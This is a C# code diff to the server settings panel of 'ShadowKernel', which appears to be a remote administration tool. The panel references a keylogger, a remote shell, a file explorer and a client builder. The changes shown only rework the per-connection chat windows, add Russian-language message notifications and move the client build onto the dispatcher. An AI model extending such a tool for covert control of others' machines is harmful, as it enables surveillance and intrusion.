@@ -27,8 +27,7 @@ namespace ShadowKernel.userControls
     public partial class SettingsServer : System.Windows.Controls.UserControl
     {
         
-        private Classes.Settings.Values Settings;
-        
+
         public Server serverFrm;
         private CompInfo CI = new CompInfo();
         private TaskManager TM = new TaskManager();
@@ -36,7 +35,7 @@ namespace ShadowKernel.userControls
         private FileExplorer FE = new FileExplorer();
         private RemoteShell RS = new RemoteShell();
         private Keylogger K = new Keylogger();
-        public static Chat C = new Chat();
+        public  Dictionary<int, Chat> chats = new Dictionary<int, Chat>();
         public static Image ImageToDisplay;
         public static BackgroundWorker bwUpdateImage;
         public MainWindow wind;
@@ -53,6 +52,7 @@ namespace ShadowKernel.userControls
             bwUpdateImage.WorkerSupportsCancellation = true;
             serverFrm = (Server)wind.stgServer;
             this.wind = wind;
+            
         }
         public void Init()
         {
@@ -138,6 +138,8 @@ namespace ShadowKernel.userControls
             public string WT { get; set; }
         }
 
+        
+
         /// <summary>
         /// Gets all data that has been sent to the server and handles it
         /// </summary>
@@ -151,6 +153,7 @@ namespace ShadowKernel.userControls
                     case EventType.Connected:
                         string ClientAddress = MainServer.GetClientAddress(Data.connectionId);
                         serverFrm.dtgClients.Items.Add(new MyItem { ID = Data.connectionId.ToString(), IP = ClientAddress, Tag = "N/A", AV = "N/A", OS = "N/A",  WT = "N/A"});
+                        chats.Add(Data.connectionId,new Chat());
                         if ((bool)notify.IsChecked)
                         {
                             new ToastContentBuilder()
@@ -752,17 +755,24 @@ namespace ShadowKernel.userControls
         /// <param name="Message"></param>
         public void AddMessage(int ConnectionId, string Message)
         {
-            foreach (Chat C in System.Windows.Application.Current.Windows.OfType<Chat>())
-                if (C.Visibility == Visibility.Visible && C.ConnectionID == ConnectionId && C.Update)
-                {
-                    //C.txtChat.AppendText(Environment.NewLine + GetClientTagFromId(ConnectionId) + ": " + Message);
-                    System.Windows.Controls.ContentControl t = new System.Windows.Controls.ContentControl();
-                    t.Content = Message + Environment.NewLine + DateTime.Now.ToString("HH:mm");
-                    Chat c = new Chat();
-                    Style style = c.FindResource("BubbleLeftStyle") as Style;
-                    t.Style = style;
-                    C.chatPlace.Children.Add(t);
-                }
+            Chat chat = chats[ConnectionId];
+            System.Windows.Controls.ContentControl t = new System.Windows.Controls.ContentControl();
+            t.Content = Message + Environment.NewLine + DateTime.Now.ToString("HH:mm");
+            Chat c = new Chat();
+            Style style = c.FindResource("BubbleLeftStyle") as Style;
+            t.Style = style;
+            chat.chatPlace.Children.Add(t);
+            
+            if ((bool)notify.IsChecked)
+            {
+                string name = GetSubstringByString("Чат с", ")",chat.title.Text);
+                new ToastContentBuilder().AddArgument("action", "viewConversation")
+                    .AddArgument("conversationId", 9813)
+                    .AddText("Сообщение от " + name)
+                    .AddText(t.Content.ToString())
+                    .Show();
+            }
+
         }
 
         /// <summary>
@@ -908,10 +918,12 @@ namespace ShadowKernel.userControls
 
             if (dlg.ShowDialog() != DialogResult.Cancel)
             {
-                // Save document
-                ClientBuilder.BuildClient(Port.Text, ShadowKernel.helper.Session.CurrentAuditer.Login.ToString(), myIP, dlg.FileName, Tag.Text, "1",
-                "False", "False");
-                System.Diagnostics.Process.Start("explorer.exe", dlg.FileName.Substring(0, dlg.FileName.LastIndexOf("\\")));
+                Dispatcher.Invoke(() =>
+                {
+                    ClientBuilder.BuildClient(Port.Text, helper.Session.CurrentAuditer.Login.ToString(), myIP, dlg.FileName, Tag.Text, "1",
+                    "False", "False");
+                    System.Diagnostics.Process.Start("explorer.exe", dlg.FileName.Substring(0, dlg.FileName.LastIndexOf("\\")));
+                });
 
             }
             else { return; }
